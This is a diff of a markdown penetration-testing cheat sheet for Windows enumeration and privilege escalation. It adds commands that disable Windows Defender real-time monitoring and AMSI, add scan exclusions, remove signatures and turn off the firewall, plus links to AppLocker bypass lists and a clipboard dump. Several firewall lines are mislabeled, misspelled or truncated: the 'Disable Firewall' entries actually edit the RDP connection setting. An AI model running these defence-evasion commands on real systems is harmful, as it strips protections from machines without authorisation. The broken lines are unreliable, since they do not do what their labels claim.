@@ -41,6 +41,14 @@ Get-ChildItem Env: | ft Key,Value
 Get-HotFix
 ```
 
+uninstall hot fixes \(need permission\):
+
+```text
+wusa /uninstall /kb:1234512
+```
+
+
+
 patchs and updates:
 
 ```text
@@ -55,7 +63,15 @@ wmic logicaldisk get caption,description,providername
 Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
 ```
 
-### 
+#### list kernel drivers
+
+```text
+driverquery | findstr Kernel
+```
+
+
+
+
 
 ### Kernel Exploits
 
@@ -131,35 +147,21 @@ cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```
 
-### network and connections
+### file system drives
 
 ```text
-netstat -ano
-ipconfig /all
-arp -a
-reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
-reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
+driverquery | findstr "File System"
+driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
+Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
 ```
 
-routing info:
+### mounte volumes
 
 ```text
-route print
-Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
+mountvol
 ```
 
-network shares
-
-```text
-net share
-Find-DomainShare -ComputerDomain domain.local
-```
-
-
-
-
-
-### system logs and audit setting
+## system logs and audit setting
 
 view system auditing setting
 
@@ -204,11 +206,35 @@ check cached credentials \(domain\):
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
 ```
 
-### check for AVs
+## check for AVs
 
 ```text
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more
 Get-MpComputerStatus 
+```
+
+### windows defender
+
+if you have privileges:
+
+```text
+# check status of Defender
+PS C:\> Get-MpComputerStatus
+
+# disable scanning all downloaded files and attachments, disable AMSI (reactive)
+PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
+PS C:\> Set-MpPreference -DisableIOAVProtection $true
+
+# disable AMSI (set to 0 to enable)
+PS C:\> Set-MpPreference -DisableScriptScanning 1 
+
+# exclude a folder
+PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
+PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
+PS C:\> Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
+
+# remove signatures (if Internet connection is present, they will be downloaded again):
+PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
 ```
 
 ### applocker policy
@@ -220,11 +246,67 @@ $a = Get-ApplockerPolicy -effective
 $a.rulecollections
 ```
 
-### check if UAC is enabled
+Applocker Bypass:
+
+* [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)
+* [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md)
+* [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md)
+
+### check UAC
 
 ```text
 reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ 
 ```
+
+## Network and Connections
+
+```text
+netstat -ano
+ipconfig /all
+arp -a
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
+reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
+```
+
+routing info:
+
+```text
+route print
+Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
+```
+
+### network shares
+
+```text
+net share
+Find-DomainShare -ComputerDomain domain.local
+```
+
+### firewall
+
+```text
+# list firewall status and configs
+netsh advfirewall firewall dump
+# or 
+netsh firewall show state
+netsh firewall show config
+
+
+# list blocked ports
+$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
+
+# Disable Firewall on Windows 7 via cmd
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+# Disable Firewall on Windows 7 via Powershell
+powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value'`
+
+# Disable Firewall on any windows via cmd
+netsh firewall set opmode disable
+netsh Advfirewall set allprofiles state off
+```
+
+
 
 ## Users and Groups
 
@@ -254,6 +336,13 @@ Get-WmiObject -Class Win32_UserAccount
 Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 ```
 
+local user home directories
+
+```text
+dir C:\Users
+Get-ChildItem C:\Users
+```
+
 find local admins
 
 ```text
@@ -279,11 +368,18 @@ net localgroup administrators
 Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 ```
 
+logged users/sessions
 
+```text
+qwinsta
+klist sessions
+```
 
+dump clipboard
 
-
-
+```text
+powershell -command "Get-Clipboard"
+```
 
 
 
